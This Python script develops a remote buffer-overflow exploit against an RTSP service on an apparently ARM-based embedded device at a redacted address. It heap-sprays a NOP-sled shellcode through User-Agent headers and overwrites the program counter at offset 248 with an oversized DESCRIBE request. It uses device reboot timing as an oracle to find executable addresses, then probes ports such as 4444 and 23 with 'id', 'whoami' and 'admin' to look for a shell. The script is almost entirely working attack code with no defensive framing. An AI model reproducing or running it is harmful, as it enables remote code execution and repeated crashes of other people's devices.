#!/usr/bin/env python3
"""
Address-space oracle scan v2 — corrected logic.

Key insight from v1:
  - 0xFFFF0xxx addresses are > 0xC0000000 → kernel space
  - They cause full device reboot (~74s), same as DEADBEEF
  - A 15s oracle timeout shows them as NO-RESTART (false positive)

v2 fixes:
  - Only probe addresses in userspace: 0x00000000 – 0xBFFFFFFF
  - Two-phase oracle:
      Phase 1: 10s poll → classify FAST(<4s), MEDIUM(4-10s), SLOW(>10s)
      Phase 2: for SLOW entries only — extend poll to 90s to classify
        * restart at 10-70s → likely mapped page (code ran briefly)
        * restart at 70-90s → kernel space or full reboot (shouldn't happen for <0xC0000000)
        * still no restart at 90s → shellcode looping indefinitely (watchdog not killing?)
"""
import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

# ARM32 LE NOP sled + infinite loop (null-byte safe)
ARM_NOP  = b'\x01\x10\xa0\xe1'  # MOV R1,R1
ARM_LOOP = b'\xfe\xff\xff\xea'  # B .
SLED = ARM_NOP * 60 + ARM_LOOP   # 244 bytes — stays below 256-byte crash threshold

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_alive(max_wait=100):
    """Wait up to max_wait seconds for RTSP to respond."""
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            return True
        time.sleep(2)
    return False

def heap_spray(n=32):
    for _ in range(n):
        try:
            req = (b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\n"
                   b"CSeq: 1\r\nUser-Agent: " + SLED + b"\r\n\r\n")  # 244 bytes < 256 threshold
            s = socket.socket(); s.settimeout(4)
            s.connect((TARGET, RTSP_PORT)); s.sendall(req)
            try: s.recv(256)
            except: pass
            s.close()
        except: pass

def probe(addr, poll_timeout=90):
    """Send overflow with PC=addr, return restart_time (or poll_timeout if not restarted)."""
    pc_bytes = struct.pack('<I', addr)
    payload  = b'A' * PC_OFFSET + pc_bytes + b'C' * 64
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + payload + b"\r\n\r\n")
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req); s.close()
    except: pass

    t0 = time.time()
    deadline = t0 + poll_timeout
    PROBE_REQ = (b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\n"
                 b"CSeq: 99\r\n\r\n")
    while time.time() < deadline:
        time.sleep(0.4)
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE_REQ)   # must send a request — server doesn't banner
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:       # confirmed real response, not empty TCP ack
                return time.time() - t0
        except: pass
    return poll_timeout  # did not restart within timeout

# ─── ADDRESSES TO SCAN (all < 0xC0000000 = userspace only) ────────────────────
ADDRS = [
    # Stack: just below kernel boundary 0xC0000000
    (0xBFFF8000, "stack@0xBFFF8000"),
    (0xBFFF0000, "stack@0xBFFF0000"),
    (0xBFFE0000, "stack@0xBFFE0000"),
    (0xBFFC0000, "stack@0xBFFC0000"),
    (0xBFF80000, "stack@0xBFF80000"),
    (0xBFF00000, "stack@0xBFF00000"),
    (0xBFE00000, "stack@0xBFE00000"),
    (0xBF800000, "stack@0xBF800000"),
    # Process text (ELF load addresses, ARM)
    (0x00008000, "text@0x8000"),
    (0x00010000, "text@0x10000"),
    (0x00020000, "text@0x20000"),
    (0x00040000, "text@0x40000"),
    (0x00080000, "text@0x80000"),
    (0x00100000, "text@0x100000"),
    (0x00200000, "text@0x200000"),
    (0x00400000, "text@0x400000"),
    (0x00800000, "text@0x800000"),
    (0x01000000, "text@0x1000000"),
    # mmap / shared libraries (ARM)
    (0x40000000, "mmap@0x40000000"),
    (0x40100000, "mmap@0x40100000"),
    (0x40200000, "mmap@0x40200000"),
    (0x40400000, "mmap@0x40400000"),
    (0x40800000, "mmap@0x40800000"),
    (0x41000000, "mmap@0x41000000"),
    (0x42000000, "mmap@0x42000000"),
    (0x44000000, "mmap@0x44000000"),
    (0x48000000, "mmap@0x48000000"),
    (0x50000000, "mmap@0x50000000"),
    (0x60000000, "mmap@0x60000000"),
    (0x70000000, "mmap@0x70000000"),
]

print("=" * 60)
print("ADDRESS ORACLE SCAN v2 (userspace only)")
print("  <4s=SIGSEGV  4-70s=HIT?  >70s=kernel-reboot  90s=loop?")
print("=" * 60)

# Wait for device to be alive first
print("[*] Waiting for RTSP service to be alive...")
if not wait_alive(max_wait=120):
    print("[!] RTSP not responding after 120s — aborting")
    sys.exit(1)
print("[✓] RTSP alive — starting scan\n")

results = {}
hits    = []

for addr, label in ADDRS:
    # Ensure RTSP is alive before each probe
    if not wait_alive(max_wait=90):
        print(f"  [!] RTSP down, skipping 0x{addr:08X}")
        results[addr] = 0
        continue

    # Spray heap with shellcode before overflow
    heap_spray(n=10)  # 244-byte User-Agents, stay below crash threshold

    # Send overflow + measure restart time (full 90s poll)
    t = probe(addr, poll_timeout=90)
    results[addr] = t

    # Classify
    if t < 4:      tag = "FAST (SIGSEGV/invalid)"
    elif t < 70:   tag = f"*** HIT? mapped page ***"
    elif t < 90:   tag = f"SLOW (full reboot? kernel?)"
    else:          tag = f"NO-RESTART (looping?)"

    print(f"  0x{addr:08X}  {label:28s}  {t:5.1f}s  {tag}")
    if t >= 4:
        hits.append((addr, label, t, tag))

print()
print("=" * 60)
print("SUMMARY:")
print("=" * 60)
if hits:
    for addr, label, t, tag in hits:
        print(f"  0x{addr:08X}  {t:.1f}s  {tag}")
else:
    print("  No candidates found (all FAST/SIGSEGV)")

print()
print("=" * 60)
print("PORT BANNER PROBES")
print("=" * 60)

PORT_PROBES = {
    23:   [b'\xff\xfb\x01\xff\xfd\x1f', b'admin\r\n', b'\r\n'],
    4444: [b'id\n', b'whoami\n', b'\r\n'],
    4242: [b'id\n', b'\r\n'],
    9999: [b'\r\n', b'GET / HTTP/1.0\r\n\r\n'],
    2323: [b'\xff\xfb\x01', b'admin\r\n', b'\r\n'],
    8080: [b'GET / HTTP/1.0\r\nHost: x\r\n\r\n'],
}

for port, probes in PORT_PROBES.items():
    for probe_data in probes:
        try:
            s = socket.socket(); s.settimeout(4)
            s.connect((TARGET, port))
            banner = b""
            try: s.settimeout(2); banner = s.recv(1024)
            except socket.timeout: pass
            s.sendall(probe_data)
            resp = b""
            try: s.settimeout(3); resp = s.recv(1024)
            except socket.timeout: pass
            s.close()
            if banner or resp:
                print(f"  port {port}: banner={repr(banner)[:60]} resp={repr(resp)[:80]}")
                break
            else:
                print(f"  port {port}: probe={repr(probe_data)[:20]} → silent (NAT?)")
        except Exception as e:
            print(f"  port {port}: {type(e).__name__}: {e}")
            break

print("\nDone.")
